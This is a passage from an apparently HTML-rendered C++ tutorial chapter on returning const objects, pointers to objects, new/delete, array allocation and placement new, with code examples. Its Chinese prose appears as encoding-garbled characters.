çš„ç§»åŠ¨è¯­ä¹‰é€šå¸¸æ›´å…³å¿ƒå¯¹è±¡æ˜¯å¦æ˜¯å³å€¼ï¼Œè€Œä¸æ˜¯å®ƒæ˜¯å¦ <code>const</code>ã€‚åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œè¿”å› <code>const</code> å¯¹è±¡ç”šè‡³å¯èƒ½<strong>é˜»æ­¢ç§»åŠ¨è¯­ä¹‰</strong>çš„åº”ç”¨ï¼Œå¯¼è‡´ä¸å¿…è¦çš„å¤åˆ¶ã€‚</li><li>  å¯¹äºå†…ç½®ç±»å‹ï¼ˆå¦‚ <code>int</code>ï¼‰ï¼Œè¿”å› <code>const int</code> å‡ ä¹æ²¡æœ‰ä»»ä½•ä½œç”¨ã€‚</li></ul><p><strong>ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">const</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    String temp = <span class="string">&quot;Temporary Name&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> temp; <span class="comment">// è¿”å› const String å¯¹è±¡</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// getName()[0] = &#x27;X&#x27;; // é”™è¯¯ï¼ä¸èƒ½å¯¹è¿”å›çš„ const ä¸´æ—¶å¯¹è±¡è°ƒç”¨é const çš„ operator[]</span></span><br><span class="line">    <span class="keyword">char</span> first = getName()[<span class="number">0</span>]; <span class="comment">// OK: è°ƒç”¨ const çš„ operator[]</span></span><br><span class="line"></span><br><span class="line">    String nameCopy = getName(); <span class="comment">// OK: const ä¸´æ—¶å¯¹è±¡å¯ä»¥ç”¨æ¥åˆå§‹åŒ–é const å¯¹è±¡ (é€šè¿‡å¤åˆ¶/ç§»åŠ¨æ„é€ )</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ€»çš„æ¥è¯´ï¼Œé™¤éæœ‰éå¸¸ç‰¹æ®Šçš„åŸå› éœ€è¦é˜»æ­¢å¯¹è¿”å›çš„ä¸´æ—¶å¯¹è±¡è°ƒç”¨é <code>const</code> æ–¹æ³•ï¼Œå¦åˆ™<strong>é€šå¸¸ä¸æ¨è</strong>æŒ‰å€¼è¿”å› <code>const</code> å¯¹è±¡ã€‚ç›´æ¥æŒ‰å€¼è¿”å›é <code>const</code> å¯¹è±¡é€šå¸¸æ›´çµæ´»ï¼Œå¹¶ä¸”æ›´èƒ½å—ç›Šäº RVO å’Œç§»åŠ¨è¯­ä¹‰ã€‚</p><p><strong>æ€»ç»“:</strong></p><ul><li>  <strong>è¿”å›å¼•ç”¨ (<code>&amp;</code> æˆ– <code>const &amp;</code>):</strong> é«˜æ•ˆï¼Œæ— å¤åˆ¶ã€‚ç”¨äºè¿”å›<strong>å·²å­˜åœ¨çš„</strong>ã€ç”Ÿå‘½å‘¨æœŸè¶³å¤Ÿé•¿çš„å¯¹è±¡ã€‚<strong>ç»ä¸èƒ½</strong>è¿”å›å±€éƒ¨å˜é‡çš„å¼•ç”¨ã€‚<code>const &amp;</code> æ›´å®‰å…¨ï¼Œ<code>&amp;</code> å…è®¸ä¿®æ”¹ã€‚</li><li>  <strong>æŒ‰å€¼è¿”å› (<code>ClassName</code>):</strong> å®‰å…¨ï¼Œè¿”å›å‰¯æœ¬æˆ–ç§»åŠ¨åçš„å¯¹è±¡ã€‚é€‚ç”¨äºè¿”å›å‡½æ•°å†…åˆ›å»ºçš„æ–°å¯¹è±¡ã€‚æ•ˆç‡é€šå¸¸ç”± RVO/NRVO å’Œç§»åŠ¨è¯­ä¹‰ä¿è¯ã€‚</li><li>  <strong>æŒ‰å€¼è¿”å› <code>const</code> å¯¹è±¡ (<code>const ClassName</code>):</strong> ä¸å¸¸ç”¨ï¼Œå¯èƒ½é˜»æ­¢å¯¹ä¸´æ—¶å¯¹è±¡çš„ä¿®æ”¹ï¼Œä½†é€šå¸¸æ„ä¹‰ä¸å¤§ï¼Œç”šè‡³å¯èƒ½å½±å“ä¼˜åŒ–ã€‚</li></ul><h2 id="12-5-ä½¿ç”¨æŒ‡å‘å¯¹è±¡çš„æŒ‡é’ˆ"><a href="#12-5-ä½¿ç”¨æŒ‡å‘å¯¹è±¡çš„æŒ‡é’ˆ" class="headerlink" title="12.5 ä½¿ç”¨æŒ‡å‘å¯¹è±¡çš„æŒ‡é’ˆ"></a>12.5 ä½¿ç”¨æŒ‡å‘å¯¹è±¡çš„æŒ‡é’ˆ</h2><p>å°±åƒå¯ä»¥ä½¿ç”¨æŒ‡å‘å†…ç½®ç±»å‹ï¼ˆå¦‚ <code>int*</code>ï¼‰æˆ–ç»“æ„ï¼ˆå¦‚ <code>MyStruct*</code>ï¼‰çš„æŒ‡é’ˆä¸€æ ·ï¼Œä¹Ÿå¯ä»¥å£°æ˜å’Œä½¿ç”¨æŒ‡å‘<strong>ç±»å¯¹è±¡</strong>çš„æŒ‡é’ˆã€‚æŒ‡é’ˆæœ¬èº«å­˜å‚¨çš„æ˜¯å¯¹è±¡çš„å†…å­˜åœ°å€ã€‚</p><p><strong>å£°æ˜æŒ‡å‘å¯¹è±¡çš„æŒ‡é’ˆ:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ClassName * pointerName;</span><br></pre></td></tr></table></figure><p>ä¾‹å¦‚ï¼Œè¦å£°æ˜ä¸€ä¸ªæŒ‡å‘ <code>String</code> å¯¹è±¡çš„æŒ‡é’ˆï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;string1.h&quot;</span> <span class="comment">// åŒ…å« String ç±»å®šä¹‰</span></span></span><br><span class="line"></span><br><span class="line">String * p_string; <span class="comment">// å£°æ˜ä¸€ä¸ªæŒ‡å‘ String å¯¹è±¡çš„æŒ‡é’ˆ</span></span><br></pre></td></tr></table></figure><h3 id="12-5-1-å†è¯»-new-å’Œ-delete"><a href="#12-5-1-å†è¯»-new-å’Œ-delete" class="headerlink" title="12.5.1 å†è¯» new å’Œ delete"></a>12.5.1 å†è¯» new å’Œ delete</h3><p>ä½¿ç”¨ <code>new</code> è¿ç®—ç¬¦å¯ä»¥åœ¨è‡ªç”±å­˜å‚¨åŒºï¼ˆå †ï¼‰ä¸ŠåŠ¨æ€åœ°åˆ›å»ºå¯¹è±¡ï¼Œå¹¶è¿”å›è¯¥å¯¹è±¡çš„åœ°å€ã€‚è¿™ä¸ªåœ°å€å¯ä»¥å­˜å‚¨åœ¨ç›¸åº”ç±»å‹çš„æŒ‡é’ˆä¸­ã€‚</p><p><strong>ä½¿ç”¨ <code>new</code> åˆ›å»ºå¯¹è±¡:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pointerName = <span class="keyword">new</span> ClassName; <span class="comment">// è°ƒç”¨é»˜è®¤æ„é€ å‡½æ•°</span></span><br><span class="line">pointerName = <span class="keyword">new</span> ClassName(arguments); <span class="comment">// è°ƒç”¨åŒ¹é…å‚æ•°çš„æ„é€ å‡½æ•°</span></span><br></pre></td></tr></table></figure><p>å½“ä½¿ç”¨ <code>new ClassName(...)</code> æ—¶ï¼Œä¼šå‘ç”Ÿä¸¤ä»¶äº‹ï¼š</p><ol><li> åœ¨è‡ªç”±å­˜å‚¨åŒºåˆ†é…è¶³å¤Ÿå®¹çº³ <code>ClassName</code> å¯¹è±¡çš„å†…å­˜ã€‚</li><li> è°ƒç”¨ç›¸åº”çš„<strong>æ„é€ å‡½æ•°</strong>æ¥åˆå§‹åŒ–è¿™å—å†…å­˜ä¸­çš„å¯¹è±¡ã€‚</li></ol><p><strong>ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;string1.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">cout</span>;</span><br><span class="line">    <span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    String * p1 = <span class="keyword">new</span> String(<span class="string">&quot;Dynamically allocated string&quot;</span>); <span class="comment">// è°ƒç”¨ String(const char*)</span></span><br><span class="line">    String * p2 = <span class="keyword">new</span> String; <span class="comment">// è°ƒç”¨é»˜è®¤æ„é€ å‡½æ•° String()</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;p1 points to: &quot;</span> &lt;&lt; *p1 &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// ä½¿ç”¨ * è§£å¼•ç”¨æŒ‡é’ˆè®¿é—®å¯¹è±¡</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;p2 points to: &quot;</span> &lt;&lt; *p2 &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ... ä½¿ç”¨ p1 å’Œ p2 æŒ‡å‘çš„å¯¹è±¡ ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ä½¿ç”¨ <code>delete</code> é”€æ¯å¯¹è±¡:</strong></p><p>é€šè¿‡ <code>new</code> åˆ›å»ºçš„å¯¹è±¡å¿…é¡»ä½¿ç”¨ <code>delete</code> æ¥é”€æ¯ï¼Œä»¥é‡Šæ”¾å†…å­˜å¹¶æ‰§è¡Œæ¸…ç†å·¥ä½œã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span> pointerName;</span><br></pre></td></tr></table></figure><p>å½“ä½¿ç”¨ <code>delete pointerName</code> æ—¶ï¼Œä¼šå‘ç”Ÿä¸¤ä»¶äº‹ï¼š</p><ol><li> è°ƒç”¨ <code>pointerName</code> æŒ‡å‘çš„å¯¹è±¡çš„<strong>ææ„å‡½æ•°</strong> (<code>~ClassName()</code>)ã€‚</li><li> é‡Šæ”¾è¯¥å¯¹è±¡å ç”¨çš„å†…å­˜ã€‚</li></ol><p><strong>ç¤ºä¾‹ (ç»­):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main.cpp (ç»­)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// ... (åˆ›å»º p1, p2 çš„ä»£ç ) ...</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nDeleting objects...\n&quot;</span>;</span><br><span class="line">    <span class="keyword">delete</span> p1; <span class="comment">// è°ƒç”¨ ~String() for *p1ï¼Œç„¶åé‡Šæ”¾å†…å­˜</span></span><br><span class="line">    <span class="keyword">delete</span> p2; <span class="comment">// è°ƒç”¨ ~String() for *p2ï¼Œç„¶åé‡Šæ”¾å†…å­˜</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// p1 å’Œ p2 ç°åœ¨æ˜¯æ‚¬æŒ‚æŒ‡é’ˆï¼Œä¸åº”å†ä½¿ç”¨</span></span><br><span class="line">    p1 = <span class="literal">nullptr</span>;</span><br><span class="line">    p2 = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¿˜è®° <code>delete</code> é€šè¿‡ <code>new</code> åˆ›å»ºçš„å¯¹è±¡ä¼šå¯¼è‡´<strong>å†…å­˜æ³„æ¼</strong>ã€‚</p><p><strong><code>new[]</code> å’Œ <code>delete[]</code> ç”¨äºå¯¹è±¡æ•°ç»„:</strong></p><p>åŒæ ·å¯ä»¥åŠ¨æ€åˆ†é…å¯¹è±¡æ•°ç»„ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> size = <span class="number">5</span>;</span><br><span class="line">String * favorites = <span class="keyword">new</span> String[size]; <span class="comment">// è°ƒç”¨ size æ¬¡é»˜è®¤æ„é€ å‡½æ•°</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ... ä½¿ç”¨æ•°ç»„ ...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">delete</span> [] favorites; <span class="comment">// è°ƒç”¨ size æ¬¡ææ„å‡½æ•°ï¼Œç„¶åé‡Šæ”¾æ•´ä¸ªæ•°ç»„å†…å­˜</span></span><br></pre></td></tr></table></figure><ul><li>  <code>new ClassName[size]</code> ä¼šä¸ºæ•°ç»„ä¸­çš„<strong>æ¯ä¸ª</strong>å…ƒç´ è°ƒç”¨<strong>é»˜è®¤æ„é€ å‡½æ•°</strong>ã€‚å¦‚æœç±»æ²¡æœ‰é»˜è®¤æ„é€ å‡½æ•°ï¼Œè¿™ç§åˆ†é…æ–¹å¼å°†å¤±è´¥ã€‚</li><li>  <strong>å¿…é¡»</strong>ä½¿ç”¨ <code>delete []</code> æ¥é‡Šæ”¾é€šè¿‡ <code>new[]</code> åˆ†é…çš„æ•°ç»„ã€‚ä½¿ç”¨ <code>delete</code> (ä¸å¸¦ <code>[]</code>) ä¼šå¯¼è‡´æœªå®šä¹‰è¡Œä¸ºï¼ˆé€šå¸¸åªè°ƒç”¨ç¬¬ä¸€ä¸ªå…ƒç´ çš„ææ„å‡½æ•°ï¼Œå¹¶å¯èƒ½å¯¼è‡´å†…å­˜æŸåï¼‰ã€‚</li></ul><h3 id="12-5-2-æŒ‡é’ˆå’Œå¯¹è±¡å°ç»“"><a href="#12-5-2-æŒ‡é’ˆå’Œå¯¹è±¡å°ç»“" class="headerlink" title="12.5.2 æŒ‡é’ˆå’Œå¯¹è±¡å°ç»“"></a>12.5.2 æŒ‡é’ˆå’Œå¯¹è±¡å°ç»“</h3><ul><li>  <strong>å£°æ˜:</strong> <code>ClassName * ptr;</code></li><li>  <strong>åŠ¨æ€åˆ›å»º:</strong> <code>ptr = new ClassName(args);</code> (è°ƒç”¨æ„é€ å‡½æ•°)</li><li>  <strong>åŠ¨æ€é”€æ¯:</strong> <code>delete ptr;</code> (è°ƒç”¨ææ„å‡½æ•°)</li><li><strong>è®¿é—®æˆå‘˜:</strong><ul><li>  <strong>è§£å¼•ç”¨å’Œç‚¹å·:</strong> <code>(*ptr).memberName</code> æˆ– <code>(*ptr).methodName(args)</code></li><li>  <strong>ç®­å¤´è¿ç®—ç¬¦ (å¸¸ç”¨):</strong> <code>ptr-&gt;memberName</code> æˆ– <code>ptr-&gt;methodName(args)</code>ã€‚ç®­å¤´è¿ç®—ç¬¦ <code>-&gt;</code> æ˜¯ä¸“é—¨ä¸ºæŒ‡å‘å¯¹è±¡çš„æŒ‡é’ˆè®¿é—®å…¶æˆå‘˜è€Œè®¾è®¡çš„ï¼Œå®ƒç­‰ä»·äºå…ˆè§£å¼•ç”¨å†ç”¨ç‚¹å·è®¿é—®ã€‚</li></ul></li></ul><p><strong>ç¤ºä¾‹ (ä½¿ç”¨ç®­å¤´è¿ç®—ç¬¦):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;string1.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    String * glamour = <span class="keyword">new</span> String(<span class="string">&quot;Glamorous&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨ç®­å¤´è¿ç®—ç¬¦è®¿é—®æˆå‘˜</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;String: &quot;</span> &lt;&lt; glamour-&gt;<span class="keyword">operator</span> <span class="keyword">const</span> <span class="keyword">char</span> *() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// å‡è®¾æœ‰è½¬æ¢å‡½æ•°</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Length: &quot;</span> &lt;&lt; glamour-&gt;length() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è°ƒç”¨ length() æ–¹æ³•</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;First char: &quot;</span> &lt;&lt; (*glamour)[<span class="number">0</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// æ··åˆä½¿ç”¨ * å’Œ []</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;First char again: &quot;</span> &lt;&lt; glamour-&gt;<span class="keyword">operator</span>[](<span class="number">0</span>) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// ä½¿ç”¨ -&gt; è°ƒç”¨ operator[]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">delete</span> glamour;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="12-5-3-å†è¯»å®šä½-new-è¿ç®—ç¬¦"><a href="#12-5-3-å†è¯»å®šä½-new-è¿ç®—ç¬¦" class="headerlink" title="12.5.3 å†è¯»å®šä½ new è¿ç®—ç¬¦"></a>12.5.3 å†è¯»å®šä½ new è¿ç®—ç¬¦</h3><p>æ ‡å‡† <code>new</code> åœ¨è‡ªç”±å­˜å‚¨åŒºï¼ˆå †ï¼‰ä¸ŠæŸ¥æ‰¾å†…å­˜å—ã€‚C++ è¿˜å…è®¸é€šè¿‡å¦ä¸€ç§å½¢å¼çš„ <code>new</code>â€”â€”**å®šä½ <code>new</code> (placement new)**â€”â€”æ¥æŒ‡å®šåˆ†é…å¯¹è±¡çš„ä½ç½®ã€‚</p><p><strong>å‰æ:</strong> ä½ éœ€è¦æä¾›ä¸€ä¸ªæŒ‡å‘<strong>å·²åˆ†é…å¥½</strong>çš„å†…å­˜å—çš„åœ°å€ï¼Œå¹¶ç¡®ä¿è¯¥å†…å­˜å—è¶³å¤Ÿå¤§ä»¥å®¹çº³è¦åˆ›å»ºçš„å¯¹è±¡ã€‚</p><p><strong>è¯­æ³•:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;new&gt; // å¿…é¡»åŒ…å« &lt;new&gt; å¤´æ–‡ä»¶</span></span></span><br><span class="line"></span><br><span class="line">BufferType * buffer = <span class="comment">/* ... è·å–æŒ‡å‘å·²åˆ†é…å†…å­˜çš„æŒ‡é’ˆ ... */</span>;</span><br><span class="line">ClassName * ptr;</span><br><span class="line"></span><br><span class="line">ptr = <span class="keyword">new</span> (buffer) ClassName(arguments); <span class="comment">// åœ¨ buffer æŒ‡å‘çš„å†…å­˜ä¸Šæ„é€ å¯¹è±¡</span></span><br></pre></td></tr></table></figure><ul><li>  <code>new (buffer)</code>: è¿™éƒ¨åˆ†æ˜¯å®šä½ <code>new</code> è¿ç®—ç¬¦ã€‚å®ƒä¸åˆ†é…æ–°å†…å­˜ï¼Œè€Œæ˜¯å‘Šè¯‰ç¼–è¯‘å™¨åœ¨ <code>buffer</code> æŒ‡å‘çš„åœ°å€å¤„æ„é€ å¯¹è±¡ã€‚</li><li>  <code>ClassName(arguments)</code>: è°ƒç”¨ç›¸åº”çš„æ„é€ å‡½æ•°æ¥åˆå§‹åŒ– <code>buffer</code> æŒ‡å‘çš„å†…å­˜åŒºåŸŸã€‚</li></ul><p><strong>ä½•æ—¶ä½¿ç”¨å®šä½ <code>new</code>?</strong></p><ol><li> <strong>å†…å­˜æ± ç®¡ç†:</strong> å½“ä½ éœ€è¦è‡ªå·±ç®¡ç†ä¸€å—å¤§çš„å†…å­˜åŒºåŸŸï¼ˆå†…å­˜æ± ï¼‰ï¼Œå¹¶åœ¨å…¶ä¸­åå¤åˆ›å»ºå’Œé”€æ¯å¯¹è±¡æ—¶ï¼Œå¯ä»¥é¿å…é¢‘ç¹è°ƒç”¨æ ‡å‡† <code>new</code> å’Œ <code>delete</code> å¸¦æ¥çš„å¼€é”€å’Œå†…å­˜ç¢ç‰‡ã€‚</li><li> <strong>ç‰¹å®šç¡¬ä»¶åœ°å€:</strong> åœ¨æŸäº›åµŒå…¥å¼ç³»ç»Ÿæˆ–åº•å±‚ç¼–ç¨‹ä¸­ï¼Œå¯èƒ½éœ€è¦åœ¨ç‰¹å®šçš„ç¡¬ä»¶åœ°å€ä¸Šåˆ›å»ºå¯¹è±¡ã€‚</li><li> <strong>ä¼˜åŒ–:</strong> åœ¨æ€§èƒ½è¦æ±‚æé«˜çš„åœºæ™¯ä¸‹ï¼Œå¦‚æœèƒ½é¢„å…ˆåˆ†é…å¥½å†…å­˜ï¼Œå®šä½ <code>new</code> å¯ä»¥çœå»æ ‡å‡† <code>new</code> çš„å†…å­˜æŸ¥æ‰¾å¼€é”€ã€‚</li></ol><p><strong>é”€æ¯å®šä½ <code>new</code> åˆ›å»ºçš„å¯¹è±¡:</strong></p><p>å®šä½ <code>new</code> åªè´Ÿè´£è°ƒç”¨æ„é€ å‡½æ•°ï¼Œå®ƒ<strong>ä¸</strong>è´Ÿè´£å†…å­˜ç®¡ç†ã€‚å› æ­¤ï¼Œä½ <strong>ä¸èƒ½</strong>å¯¹é€šè¿‡å®šä½ <code>new</code> è·å–çš„æŒ‡é’ˆä½¿ç”¨æ ‡å‡†çš„ <code>delete</code>ã€‚æ ‡å‡†çš„ <code>delete</code> ä¼šå°è¯•é‡Šæ”¾å†…å­˜ï¼Œä½†è¿™å—å†…å­˜ä¸æ˜¯ç”±æ ‡å‡† <code>new</code> åˆ†é…çš„ï¼ˆæˆ–è€…ä½ æ‰“ç®—é‡ç”¨å®ƒï¼‰ã€‚</p><p>è¦é”€æ¯é€šè¿‡å®šä½ <code>new</code> åˆ›å»ºçš„å¯¹è±¡ï¼Œä½ éœ€è¦<strong>æ˜¾å¼åœ°è°ƒç”¨è¯¥å¯¹è±¡çš„ææ„å‡½æ•°</strong>ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ptr-&gt;~ClassName(); <span class="comment">// æ˜¾å¼è°ƒç”¨ææ„å‡½æ•°</span></span><br></pre></td></tr></table></figure><ul><li>  <code>ptr-&gt;~ClassName()</code>: è¿™æ˜¯è°ƒç”¨ææ„å‡½æ•°çš„è¯­æ³•ã€‚å®ƒæ‰§è¡Œå¯¹è±¡çš„æ¸…ç†å·¥ä½œï¼Œä½†<strong>ä¸é‡Šæ”¾å†…å­˜</strong>ã€‚</li><li>  å†…å­˜çš„é‡Šæ”¾ç”±ç®¡ç† <code>buffer</code> çš„ä»£ç è´Ÿè´£ï¼ˆä¾‹å¦‚ï¼Œå¦‚æœ <code>buffer</code> æ˜¯ä¸€ä¸ªå¤§çš„ <code>char</code> æ•°ç»„ï¼Œå®ƒä¼šåœ¨æ•°ç»„ç”Ÿå‘½å‘¨æœŸç»“æŸæ—¶è‡ªåŠ¨é‡Šæ”¾ï¼›å¦‚æœæ˜¯é€šè¿‡æ ‡å‡† <code>new</code> åˆ†é…çš„ï¼Œåˆ™éœ€è¦å¯¹åº”çš„ <code>delete []</code>ï¼‰ã€‚</li></ul><p><strong>ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;new&gt;      // for placement new</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;string1.h&quot;</span> <span class="comment">// å‡è®¾ String ç±»æœ‰é»˜è®¤å’Œ C-string æ„é€ å‡½æ•°åŠææ„å‡½æ•°</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> BUF = <span class="number">512</span>;</span><br><span class="line"><span class="keyword">char</span> buffer[BUF]; <span class="comment">// é¢„å…ˆåˆ†é…çš„å†…å­˜ç¼“å†²åŒº (é™æ€å­˜å‚¨)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">cout</span>;</span><br><span class="line">    <span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    String *p1, *p2;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Block 1: placement new in buffer:\n&quot;</span>;</span><br><span class="line">    p1 = <span class="keyword">new</span> (buffer) String(<span class="string">&quot;Hello&quot;</span>); <span class="comment">// åœ¨ buffer å¼€å§‹å¤„æ„é€  String(&quot;Hello&quot;)</span></span><br><span class="line">    <span class="comment">// è®¡ç®— buffer ä¸­ä¸‹ä¸€ä¸ªå¯ç”¨åœ°å€</span></span><br><span class="line">    <span class="comment">// æ³¨æ„ï¼šè¿™åªæ˜¯ä¸€ä¸ªç®€åŒ–ç¤ºä¾‹ï¼Œå®é™…å†…å­˜æ± ç®¡ç†éœ€è¦æ›´å¤æ‚çš„å¯¹é½å’Œå¤§å°è®¡ç®—</span></span><br><span class="line">    <span class="keyword">size_t</span> available_space = BUF - <span class="keyword">sizeof</span>(String);</span><br><span class="line">    <span class="keyword">void</span> * next_loc = buffer + <span class="keyword">sizeof</span>(String);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (available_space &gt;= <span class="keyword">sizeof</span>(String)) &#123;</span><br><span class="line">         p2 = <span class="keyword">new</span> (next_loc) String(<span class="string">&quot;World&quot;</span>); <span class="comment">// åœ¨ buffer çš„ä¸‹ä¸€ä¸ªä½ç½®æ„é€  String(&quot;World&quot;)</span></span><br><span 